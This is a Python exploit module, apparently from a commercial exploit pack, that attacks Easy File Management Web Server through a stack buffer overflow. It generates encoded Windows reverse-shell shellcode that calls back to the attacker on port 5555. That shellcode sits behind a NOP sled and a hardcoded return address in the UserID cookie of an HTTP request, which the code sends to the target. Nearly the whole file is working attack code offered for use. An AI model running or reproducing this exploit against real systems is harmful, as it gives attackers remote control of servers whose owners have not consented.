# -*- coding: utf-8 -*-
#!/usr/bin/python
# The exploit is a part of Agora pack - use only under the license agreement
# specified in LICENSE.txt in your Agora distribution

import sys
import re
import os
import socket
from struct import pack
import socket,sys
import os

sys.path.append("./core")
sys.path.append("./shellcodes")
from Sploit import Sploit
from Shellcodes import OSShellcodes


INFO={}
INFO['NAME']="ef_easyfile_webserver_sbo"
INFO['DESCRIPTION']="Easy File Management Web Server Stack Buffer Overflow"
INFO['VENDOR']="http://www.sharing-file.com/"
INFO["CVE Name"]="N/A"
INFO["NOTES"]="""
    Stack buffer overflow
    Tested on win xp sp2 32 bit, Tested on Windows 7 64 bit
    """
INFO['CHANGELOG']="14 July, 2015. Written by Gleg team."
INFO['PATH'] = "Exploits/"

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "192.168.1.233"
OPTIONS["PORT"] = "80"

class exploit(Sploit):
    def __init__(self,host="",
                port=0,
                logger=None):
        Sploit.__init__(self,logger=logger)
        self.port = port
        self.host = host
        self.name = INFO['NAME']
        return

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        return

    def create_shellcode(self):
        self.log("[] Generate shellcode started")
        badstring = ["\x00", "\x3b"]
        self.CONNECTBACK_IP = socket.gethostbyname(socket.gethostname())
        port = 5555
        if self.args['listener']:
            port = int(self.args['listener']['PORT'])
        self.CONNECTBACK_PORT = port
        os_system = os_target = "WINDOWS"
        os_arch = '32bit'
        shellcode_type = 'reverse'
        s = OSShellcodes(os_target, os_arch, self.CONNECTBACK_IP, self.CONNECTBACK_PORT, badstring)
        shellcode = s.create_shellcode(
            shellcode_type,
            encode=1,
            debug=1
        )
        print(shellcode)
        self.log("Shellcode type: %s for arch: %s" % (shellcode_type, os_arch))
        self.log("Length of shellcode: %d" % len(shellcode))
        self.log("[] Generate shellcode finished")
        return shellcode

    def run(self):
    	self.args()
        host=self.host
        port=self.port
        shellcode = self.create_shellcode()
        payload = "\x90"*64
        payload += "\x90\x90\xEB\x1F"
        payload += "\xF2\x95\x01\x10" #ImageLoad.dll
        payload += "\x90"*20
        payload += "\x90"*8
        payload += "\x90"*4
        payload += shellcode
        payload += "\x90"*(1500-len(payload))
        buf="GET /vfolder.ghp HTTP/1.1\r\n"
        buf+="User-Agent: Mozilla/4.0\r\n"
        buf+="Host:" + host + ":" + str(port) + "\r\n"
        buf+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        buf+="Accept-Language: en-us\r\n"
        buf+="Accept-Encoding: gzip, deflate\r\n"
        buf+="Referer: http://" + host + "/\r\n"
        buf+="Cookie: SESSIONID=1337; UserID=%s; PassWD=;\r\n"
        buf+="Conection: Keep-Alive\r\n\r\n"
        buf = str(buf) % payload
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
        	connect=s.connect((host, port))
        	self.log("[*] Connected to " + host + "!")
        except:
        	self.log("[!] " + host + " didn't respond")
        	self.finish(False)
        	return 0
        self.log("[*] Sending malformed request...")
        s.send(buf)
        self.log("[!] Exploit has been sent!")
        s.close()
        self.finish(True)
        return 1

if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
